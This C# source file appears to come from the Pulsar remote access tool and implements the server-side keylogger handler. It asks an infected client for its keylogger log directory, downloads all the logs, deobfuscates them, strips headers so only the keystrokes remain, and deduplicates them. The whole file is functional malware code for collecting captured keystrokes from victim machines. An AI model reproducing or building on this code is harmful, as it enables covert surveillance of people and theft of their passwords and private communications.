using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Monitoring.KeyLogger;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Messages
{
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        private readonly Client _client;
        private readonly FileManagerHandler _fileManagerHandler;

        private string? _remoteKeyloggerDirectory;
        private int _allTransfers;
        private int _completedTransfers;
        private bool _disposed;

        private readonly HashSet<string> _processedLogs = new HashSet<string>();
        private string _lastProcessedContent = string.Empty;
        private readonly object _processLock = new object();

        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));

            // All keylogger logs go under Logs\
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            SubscribeEvents();
            MessageHandler.Register(_fileManagerHandler);
        }

        public override bool CanExecute(IMessage message) =>
            message is GetKeyloggerLogsDirectoryResponse;

        public override bool CanExecuteFrom(ISender sender) =>
            _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            if (message is GetKeyloggerLogsDirectoryResponse response)
                Execute(sender, response);
        }

        public void RetrieveLogs()
        {
            try
            {
                _client.Send(new GetKeyloggerLogsDirectory());
            }
            catch (Exception ex)
            {
                OnReport($"Failed to request logs: {ex.Message}");
            }
        }

        /// <summary>
        /// Manual path to download all logs from a known file list.
        /// This is fully async and does not block the UI thread.
        /// </summary>
        public async Task DownloadAllLogsAsync(FileSystemEntry[] items)
        {
            if (items == null || items.Length == 0)
            {
                OnReport("No logs found");
                return;
            }

            _allTransfers = items.Length;
            _completedTransfers = 0;

            foreach (var item in items)
            {
                if (item == null || string.IsNullOrWhiteSpace(item.Name))
                    continue;

                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    _client.Disconnect();
                    return;
                }

                string localPath = FileHelper.GetTempFilePath(".txt");

                var tcs = new TaskCompletionSource<bool>();
                void transferHandler(object? s, FileTransfer transfer)
                {
                    if (transfer.LocalPath == localPath &&
                        string.Equals(transfer.Status, "Completed", StringComparison.OrdinalIgnoreCase))
                    {
                        tcs.TrySetResult(true);
                    }
                }

                _fileManagerHandler.FileTransferUpdated += transferHandler;
                _fileManagerHandler.BeginDownloadFile(item.Name, Path.GetFileName(localPath), true);

                // Wait for completion with timeout but keep UI thread free
                if (await Task.WhenAny(tcs.Task, Task.Delay(30000)) != tcs.Task)
                {
                    OnReport($"Download timed out: {item.Name}");
                }

                _fileManagerHandler.FileTransferUpdated -= transferHandler;

                // Process downloaded log on a worker thread
                await Task.Run(() => SafeWriteDeobfuscatedLog(localPath));

                Interlocked.Increment(ref _completedTransfers);
                OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));
            }

            OnReport("Successfully retrieved all logs");
        }

        private void Execute(ISender sender, GetKeyloggerLogsDirectoryResponse message)
        {
            if (string.IsNullOrWhiteSpace(message.LogsDirectory))
            {
                OnReport("Invalid or empty logs directory.");
                return;
            }

            _remoteKeyloggerDirectory = message.LogsDirectory;
            sender.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
        }

        private void StatusUpdated(object? sender, string value)
        {
            // This event is raised on the UI thread, keep it light.
            OnReport($"No logs found ({value})");
        }

        /// <summary>
        /// Called on UI thread by FileManagerHandler using SynchronizationContext.Post.
        /// We immediately offload any heavy work (loop + network calls) to a background task
        /// so the UI/file manager stays responsive.
        /// </summary>
        private void DirectoryChanged(object? sender, string? remotePath, FileSystemEntry[]? items)
        {
            if (string.IsNullOrWhiteSpace(remotePath))
            {
                OnReport("Invalid remote directory");
                return;
            }

            if (items == null || items.Length == 0)
            {
                OnReport("No logs found");
                return;
            }

            _allTransfers = items.Length;
            _completedTransfers = 0;
            OnReport(GetDownloadProgress());

            // Offload heavy loop and BeginDownloadFile calls to worker thread
            var safeRemotePath = remotePath;
            var safeItems = items.ToArray(); // copy in case original changes

            _ = Task.Run(() =>
            {
                foreach (var item in safeItems)
                {
                    if (item == null || string.IsNullOrWhiteSpace(item.Name))
                        continue;

                    if (FileHelper.HasIllegalCharacters(item.Name))
                    {
                        _client.Disconnect();
                        return;
                    }

                    string remoteFile = Path.Combine(safeRemotePath, item.Name);
                    string localPath = FileHelper.GetTempFilePath(".txt");

                    _fileManagerHandler.BeginDownloadFile(
                        remoteFile,
                        Path.GetFileName(localPath),
                        true);
                }
            });
        }

        /// <summary>
        /// Event is fired on UI thread. Keep it light and move processing
        /// (file IO + hashing + filtering) to a worker thread.
        /// </summary>
        private void FileTransferUpdated(object? sender, FileTransfer transfer)
        {
            if (!string.Equals(transfer.Status, "Completed", StringComparison.OrdinalIgnoreCase))
                return;

            Interlocked.Increment(ref _completedTransfers);

            string localPath = transfer.LocalPath;

            if (!string.IsNullOrWhiteSpace(localPath))
            {
                _ = Task.Run(() =>
                {
                    try
                    {
                        SafeWriteDeobfuscatedLog(localPath);
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Failed to process log file: {ex.Message}");
                    }
                });
            }

            OnReport(_completedTransfers >= _allTransfers
                ? "Successfully retrieved all logs"
                : GetDownloadProgress());
        }

        private void SafeWriteDeobfuscatedLog(FileTransfer transfer)
        {
            if (string.IsNullOrWhiteSpace(transfer.LocalPath) || !File.Exists(transfer.LocalPath))
                throw new FileNotFoundException("Transfer file not found", transfer.LocalPath);

            SafeWriteDeobfuscatedLog(transfer.LocalPath);
        }

        private void SafeWriteDeobfuscatedLog(string filePath)
        {
            lock (_processLock)
            {
                if (!File.Exists(filePath))
                    return;

                string content = FileHelper.ReadObfuscatedLogFile(filePath);
                string filteredContent = FilterSpamContent(content);

                // Check for duplicates using hash
                string contentHash = GetContentHash(filteredContent);
                if (_processedLogs.Contains(contentHash) || filteredContent == _lastProcessedContent)
                {
                    return; // Skip duplicate
                }

                _processedLogs.Add(contentHash);
                _lastProcessedContent = filteredContent;

                // Limit cache size to prevent memory issues
                if (_processedLogs.Count > 1000)
                    _processedLogs.Clear();

                FileHelper.WriteObfuscatedLogFile(filePath, filteredContent);
            }
        }

        private string FilterSpamContent(string content)
        {
            if (string.IsNullOrEmpty(content))
                return content;

            // Remove spammy headers, keep only keystroke content
            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);

            var keepLines = lines.Where(line =>
                !line.Trim().StartsWith("Log created on", StringComparison.OrdinalIgnoreCase) &&
                !string.IsNullOrWhiteSpace(line));

            return string.Join(Environment.NewLine, keepLines);
        }

        private string GetContentHash(string content)
        {
            using var sha256 = SHA256.Create();
            byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(content));
            return Convert.ToBase64String(hash);
        }

        private string GetDownloadProgress()
        {
            return GetDownloadProgress(_allTransfers, _completedTransfers);
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            if (allTransfers <= 0)
                return "Downloading...";

            decimal progress = Math.Round((decimal)completedTransfers / allTransfers * 100m, 2);
            return $"Downloading... {progress}% ({completedTransfers}/{allTransfers})";
        }

        private void SubscribeEvents()
        {
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
        }

        private void UnsubscribeEvents()
        {
            _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
            _fileManagerHandler.ProgressChanged -= StatusUpdated;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed) return;

            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                UnsubscribeEvents();
                _fileManagerHandler.Dispose();
                _processedLogs.Clear();
            }

            _disposed = true;
        }
    }
}
